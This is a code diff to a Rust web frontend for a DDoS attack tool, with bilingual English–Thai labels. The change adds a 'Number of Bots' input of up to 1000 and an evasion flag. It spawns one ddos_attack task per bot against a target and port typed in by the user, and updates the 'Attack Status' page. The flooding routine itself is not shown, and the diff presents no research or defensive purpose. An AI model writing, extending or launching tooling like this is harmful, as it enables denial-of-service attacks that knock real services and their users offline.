@@ -56,6 +56,9 @@ pub async fn run_web_frontend() -> Result<(), Box<dyn Error + Send + Sync>> {
         <label for="duration">Duration (seconds):</label>
         <input id="duration" name="duration" value="60" type="number" min="1">
         <p class="description">ระยะเวลาการโจมตีเป็นวินาที (เช่น 60 วินาที)</p>
+        <label for="bots">Number of Bots:</label>
+        <input id="bots" name="bots" value="1" type="number" min="1" max="1000">
+        <p class="description">จำนวนบอทที่ใช้โจมตี (เช่น 10 บอท)</p>
         <button type="submit">Start Attack</button>
         </form>
         </div>
@@ -97,11 +100,18 @@ pub async fn run_web_frontend() -> Result<(), Box<dyn Error + Send + Sync>> {
             let port: u16 = port_str.parse().unwrap_or(80);
             let duration_str = form.get("duration").unwrap_or(&"60".to_string()).clone();
             let duration: u64 = duration_str.parse().unwrap_or(60);
+            let bots_str = form.get("bots").unwrap_or(&"1".to_string()).clone();
+            let num_bots: usize = bots_str.parse().unwrap_or(1);
+            let evasion = form.contains_key("evasion");
             let attack_type_clone = attack_type.clone();
             let target_clone = target.clone();
-            tokio::spawn(async move {
-                ddos_attack(attack_type_clone, target_clone, port, duration).await;
-            });
+            for _ in 0..num_bots {
+                let attack_type_spawn = attack_type_clone.clone();
+                let target_spawn = target_clone.clone();
+                tokio::spawn(async move {
+                    ddos_attack(attack_type_spawn, target_spawn, port, duration, evasion).await;
+                });
+            }
             let response_html = format!(r##"
             <html>
             <head><title>Attack Status</title></head>
@@ -110,6 +120,7 @@ pub async fn run_web_frontend() -> Result<(), Box<dyn Error + Send + Sync>> {
             <p>Type: {} / ประเภท: {}</p>
             <p>Target: {} / เป้าหมาย: {}</p>
             <p>Duration: {} seconds / ระยะเวลา: {} วินาที</p>
+            <p>Number of Bots: {} / จำนวนบอท: {}</p>
             <p id="countdown">Time remaining: {} seconds / เหลือเวลา: {} วินาที</p>
             <script>
             let timeLeft = {};
@@ -126,7 +137,7 @@ pub async fn run_web_frontend() -> Result<(), Box<dyn Error + Send + Sync>> {
             <a href='/'>Back / กลับ</a>
             </body>
             </html>
-            "##, attack_type, attack_type, target, target, duration, duration, duration, duration, duration);
+            "##, attack_type, attack_type, target, target, duration, duration, num_bots, num_bots, duration, duration, duration);
             warp::reply::html(response_html)
         });
 
